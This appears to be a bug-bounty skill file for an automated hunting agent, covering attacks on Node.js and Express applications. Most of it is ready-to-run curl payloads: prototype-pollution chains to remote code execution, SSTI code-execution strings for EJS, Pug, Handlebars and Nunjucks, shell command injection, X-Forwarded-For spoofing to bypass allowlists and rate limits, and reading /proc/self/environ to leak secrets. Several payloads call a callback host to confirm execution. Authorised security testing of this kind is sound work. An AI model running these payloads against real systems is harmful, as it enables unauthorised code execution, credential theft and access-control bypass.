---
name: hunt-nodejs
description: Hunt Node.js specific vulnerabilities — Prototype Pollution → RCE chains (lodash/merge/assign), Express trust proxy misconfiguration, child_process/eval injection, template engine SSTI (EJS/Pug/Handlebars), path traversal in file servers, require() injection, environment variable exfil via /proc/self/environ. Use when target runs Node.js/Express/Fastify/NestJS/Koa.
sources: hackerone_public, snyk_research, portswigger_research
report_count: 24
---

# HUNT-NODEJS — Node.js Specific Vulnerabilities

## Crown Jewel Targets

Prototype Pollution reaching a sink in Node.js backend = Critical RCE.

**Highest-value chains:**
- **Prototype Pollution → RCE** — `__proto__` injection via `lodash.merge` / `Object.assign` → polluted prototype reaches `child_process.exec` or `vm.runInNewContext` sink
- **Express trust proxy** — `app.set('trust proxy', true)` without validation → attacker sets `X-Forwarded-For` to bypass IP allowlists or rate limits
- **EJS/Pug SSTI** — template engine receives user input → `{{= process.mainModule.require('child_process').execSync('id') }}`
- **`child_process` injection** — user input interpolated into shell command string → OS command injection
- **`require()` path traversal** — attacker-controlled module path → load arbitrary file as JS

---

## Attack Surface Signals

```
X-Powered-By: Express           Confirms Express.js
Node.js in error messages        Runtime detected
package.json exposed             Dependency list + versions
/proc/self/environ accessible    Environment variable exfil
Error stack traces with .js paths  Node.js confirmed
__proto__ in JSON accepted        Prototype pollution candidate
```

---

## Phase 1 — Fingerprint

```bash
# Confirm Node.js/Express
curl -sI https://$TARGET/ | grep -i "x-powered-by\|nodejs\|express"

# Check for package.json / node_modules exposure
curl -s "https://$TARGET/package.json"
curl -s "https://$TARGET/package-lock.json"
curl -s "https://$TARGET/node_modules/.package-lock.json"

# Error-based version detection
curl -s "https://$TARGET/nonexistent-path-xyz" | grep -i "node\|express\|cannot GET"
```

---

## Phase 2 — Prototype Pollution Detection

```bash
# JSON body injection — test if __proto__ is accepted
curl -s -X POST https://$TARGET/api/merge \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"polluted": "yes"}}'

# Constructor prototype
curl -s -X POST https://$TARGET/api/settings \
  -H "Content-Type: application/json" \
  -d '{"constructor": {"prototype": {"isAdmin": true}}}'

# URL query param injection (qs library)
curl -s "https://$TARGET/api/search?__proto__[polluted]=yes&query=test"
curl -s "https://$TARGET/api/data?constructor[prototype][admin]=1"

# Confirm pollution: does a subsequent request reflect the polluted key?
curl -s "https://$TARGET/api/me" | grep -i "polluted\|isAdmin\|admin"

# BLIND pollution confirmation (no reflection) — pollute a key the framework reads later.
# status/json-spaces pollution changes response SHAPE without echoing your key:
curl -s -X POST https://$TARGET/api/any -H "Content-Type: application/json" \
  -d '{"__proto__":{"json spaces":10}}'            # subsequent JSON responses become indented
curl -s -X POST https://$TARGET/api/any -H "Content-Type: application/json" \
  -d '{"__proto__":{"status":510}}'                # Express may return 510 on the NEXT request
# Body/header-diff a clean baseline vs post-pollution response — a changed shape with no
# echoed key is a definitive BLIND pollution signal (ships: prototype-pollution-finder / ppmap).
```

**Prototype-pollution decision tree (generic, any stack):**
1. Does the app accept `__proto__` / `constructor.prototype` via JSON body, query string (qs/express), or multipart? Test all three parsers — one is often unprotected.
2. Confirm pollution: reflected key (easy) OR blind shape-change (`json spaces`, `status`, `content-type` override). Blind counts.
3. Find the sink the polluted key reaches: template-engine options (EJS `outputFunctionName`, Pug/Handlebars), `child_process` spawn options (`shell`, `env`, `NODE_OPTIONS`), `require`/`import`, or ajv/validation bypass (`__proto__` sets a default that satisfies a schema → mass-assignment).
4. No RCE sink reachable? A pollution that flips an authz flag or validation default is still High (privilege escalation / mass assignment) — report that impact, don't overclaim RCE.

---

## Phase 3 — Prototype Pollution → RCE Chain

```bash
# If pollution is confirmed, attempt to reach dangerous sinks

# Sink 1: child_process via options.shell pollution
curl -s -X POST https://$TARGET/api/update \
  -H "Content-Type: application/json" \
  -d '{
    "__proto__": {
      "shell": "node",
      "NODE_OPTIONS": "--require /proc/self/fd/0",
      "env": {"NODE_OPTIONS": "--inspect=COLLAB_HOST"}
    }
  }'

# Sink 2: lodash template pollution (CVE-2021-23337)
curl -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"sourceURL": "\nreturn process.mainModule.require(\"child_process\").execSync(\"id\").toString()//"}}'

# Sink 3: ejs template options pollution
# If EJS is used for rendering, pollute the `opts.escapeXML` or `opts.outputFunctionName`
curl -s -X POST https://$TARGET/api/template \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"outputFunctionName": "x;process.mainModule.require(\"child_process\").execSync(\"curl COLLAB_HOST/pp-rce\");x"}}'

# OOB confirmation — check Interactsh for callback
```

---

## Phase 4 — Express Trust Proxy Abuse

```bash
# If Express has trust proxy enabled, X-Forwarded-For is trusted
# Test: does spoofed IP bypass IP-based rate limiting or allowlist?

# Spoof IP to 127.0.0.1 (localhost bypass)
curl -s -X POST https://$TARGET/api/admin/action \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "Content-Type: application/json" \
  -d '{"action": "test"}'

# Spoof to internal IP range
curl -s -X POST https://$TARGET/api/internal \
  -H "X-Forwarded-For: 10.0.0.1" \
  -H "X-Real-IP: 10.0.0.1"

# Rate-limit-reset PROOF (NOT brute force): send a small controlled burst to the SAME
# synthetic account to the point of 429, then flip X-Forwarded-For and show the counter
# resets. Stop at proof — a handful of requests, never a password list / keyspace.
for ip in 1.1.1.1 1.1.1.1 1.1.1.1 2.2.2.2; do
  curl -s https://$TARGET/api/login -H "X-Forwarded-For: $ip" \
    -d '{"email":"synthetic-nonexistent-zzz@example.com","password":"wrong-fixed-value"}' \
    -o /dev/null -w "$ip -> %{http_code}\n"
done
# Signal: 200/401 → 200/401 → 429 (limited), then 200/401 again after the IP flip = per-IP
# counter spoofable via trust-proxy. That is the finding; do not escalate into real cracking.
```

---

## Phase 5 — Template Engine SSTI (EJS / Pug / Handlebars)

```bash
# EJS SSTI — if user input reaches EJS template context
# Test basic: <%= 7*7 %> should return 49
curl -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"template": "<%= 7*7 %>"}'

# EJS RCE payload
curl -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"template": "<%= process.mainModule.require(\"child_process\").execSync(\"id\").toString() %>"}'

# Pug SSTI
curl -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"template": "- var x = root.process\n= x.mainModule.require(\"child_process\").execSync(\"id\")"}'

# Handlebars RCE (working gadget — constructor.constructor escape).
# Detect first: Handlebars reflects {{this}} and errors on {{7*7}} (no inline math).
curl -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"template":"{{#with \"constructor\" as |a|}}{{#with (a.constructor.constructor \"return process.mainModule.require('"'"'child_process'"'"').execSync('"'"'id'"'"').toString()\") as |f|}}{{f}}{{/with}}{{/with}}"}'

# Nunjucks (common Express templating) RCE:
curl -s -X POST https://$TARGET/api/render -H "Content-Type: application/json" \
  -d '{"template":"{{range.constructor(\"return global.process.mainModule.require('"'"'child_process'"'"').execSync('"'"'id'"'"')\")()}}"}'

# Confirm with OOB if output is not reflected: replace id with
#   curl http://UNIQUE.COLLAB/ssti  (unique subdomain) and poll the listener.
```

---

## Phase 6 — child_process Command Injection

```bash
# Look for endpoints that run shell commands with user input
# Signals: /api/convert, /api/exec, /api/ping, /api/scan

# Basic injection test
curl -s "https://$TARGET/api/ping?host=127.0.0.1;id"
curl -s "https://$TARGET/api/convert?file=test.pdf;curl+COLLAB_HOST/ci"
curl -s -X POST https://$TARGET/api/exec \
  -H "Content-Type: application/json" \
  -d '{"command": "ls", "args": ["&&", "curl", "COLLAB_HOST/ci"]}'

# OOB via DNS
curl -s "https://$TARGET/api/dns?host=\$(curl+COLLAB_HOST/dns-ci).example.com"
```

---

## Phase 7 — /proc/self/environ Exfil

```bash
# If LFI exists on Node.js app, /proc/self/environ leaks env vars
curl -s "https://$TARGET/api/file?path=/proc/self/environ"
curl -s "https://$TARGET/api/read?file=../../../../proc/self/environ"

# Also check:
curl -s "https://$TARGET/api/file?path=/proc/self/cmdline"  # full command line
curl -s "https://$TARGET/api/file?path=/proc/self/cwd"       # working directory
```

---

## Chain Table

| Node.js finding | Chain to | Impact |
|----------------|----------|--------|
| Prototype pollution confirmed | Find RCE sink (child_process, eval) | Critical RCE |
| Express trust proxy | Bypass IP allowlist / rate limit | Auth bypass / DoS bypass |
| SSTI in template engine | OS command execution | Critical RCE |
| child_process injection | `id && curl COLLAB_HOST` | Critical RCE |
| /proc/self/environ via LFI | AWS_ACCESS_KEY_ID leaked | Cloud compromise |

---

## Validation

✅ Prototype pollution: polluted key appears in a later response OR causes a provable blind shape-change (`json spaces`/`status`) body-diffed vs a clean baseline
✅ RCE chain: OOB callback on a unique subdomain received OR `id`/`whoami` output in response (not just "no error")
✅ Trust proxy: spoofed `X-Forwarded-For` accepted and demonstrably resets a rate counter or passes an IP allowlist — prove the state change, don't infer it
✅ SSTI: `{{7*7}}`→49 for the right engine, then RCE confirmed by command output or OOB

**Severity:**
- Prototype pollution → RCE: Critical
- SSTI → RCE: Critical
- child_process injection: Critical
- Trust proxy → rate limit bypass: Medium
- /proc/self/environ exfil: High (if cloud keys present)

## Before you report — dedup gate

Fresh/changed surface first (see `dedup-novelty`, `changed-js-deepdive`), and hunt classes in yield
order (`/yield`). Before drafting ANY finding from this skill, run the dedup gate:

```bash
python3 engine/dedup.py check --program <program> --class <class> --url "<endpoint>" --title "<title>"
```

`NOVEL` -> proceed to `/validate`. `LIKELY_DUP` -> stop unless you can prove a concrete differentiator
(different endpoint/param/impact, or a bypass of the deployed fix -> report as a regression).
